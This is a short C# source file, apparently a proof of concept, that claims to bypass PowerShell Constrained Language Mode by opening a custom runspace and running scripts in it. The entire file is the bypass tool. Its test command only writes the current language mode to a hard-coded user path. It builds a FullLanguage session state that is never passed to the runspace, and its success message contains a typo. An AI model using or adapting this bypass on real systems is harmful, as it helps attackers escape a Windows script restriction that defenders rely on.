/*
Bypass PowerShell CLM by creating a custom runspace that can run PowerShell scripts.
*/

using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            InitialSessionState iss = InitialSessionState.CreateDefault();
            iss.LanguageMode = PSLanguageMode.FullLanguage;
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Users\\vex\\Dev\\CustomRunspace\\test.txt";

            ps.AddScript(cmd);
            ps.Invoke();

            if (ps.Streams.Error.Count > 0)
            {
                foreach (var error in ps.Streams.Error)
                {
                    Console.WriteLine("[-] Error: " + error.ToString());
                }
            }
            else
            {
                // Log the output to the terminal 
                Console.WriteLine("[+] Command exeucted successfully!");

            }

            rs.Close();
        }
    }
}
